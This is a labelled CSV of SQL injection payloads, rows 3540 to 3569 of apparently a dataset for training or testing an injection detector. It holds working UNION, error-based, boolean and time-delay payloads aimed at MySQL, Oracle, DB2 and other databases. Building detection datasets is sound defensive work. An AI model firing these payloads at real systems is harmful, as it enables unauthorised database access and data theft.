row_index,payload_norm,label,sqli_type_hint
3540,"-6368' union all select 6529,6529,6529--",1,
3541,-3378' ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 'otbq' = 'otbq,1,
3542,"1 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1,
3543,"1%"" ) ) and 4595 = 4595#",1,
3544,"1%"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""%"" = """,1,
3545,-3450' where 4478 = 4478 or 9323 = 9323#,1,
3546,"-6478"" ) ) union all select 7087,7087,7087,7087,7087,7087,7087,7087--",1,
3547,"1 ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
3548,"-3725' ) ) union all select 1541,1541,1541,1541,1541#",1,
3549,"1%"" and 5411 = 7697 and ""%"" = """,1,
3550,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and '%' = '",1,
3551,"-2059%"" or elt ( 4587 = 3101,3101 ) and ""%"" = """,1,
3552,"1"" ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""vnso"" like ""vnso",1,
3553,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""cxsu"" like ""cxsu",1,
3554,"-5158' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 'noaj' like 'noaj",1,
3555,"1%"" ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
3556,"1"" ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
3557,"-6733' ) where 4024 = 4024 union all select 4024,4024,4024,4024#",1,
3558,1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 7805 = 7805,1,
3559,select ( case when ( 7980 = 3703 ) then 7980 else 7980* ( select 7980 from information_schema.character_sets ) end ) #,1,
3560,1' where 2911 = 2911,1,
3561,"1' ) ) as namw where 1740 = 1740 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1,
3562,-4684 ) as uqjn where 4550 = 4550 or 1689 = 5825,1,
3563,"1 ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 4090 = 4090",1,
3564,"1'|| ( select 'dbxr' where 4014 = 4014 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
3565,"-4947' in boolean mode ) union all select 3314,3314#",1,
3566,"-7101 ) ) ) union all select 4587,4587,4587,4587,4587,4587--",1,
3567,1'+ ( select 'sfko' where 6853 = 6853 rlike sleep ( 5 ) #,1,
3568,1'|| ( select 'xqqp' where 3007 = 3007 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,
3569,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""jcyh"" = ""jcyh",1,
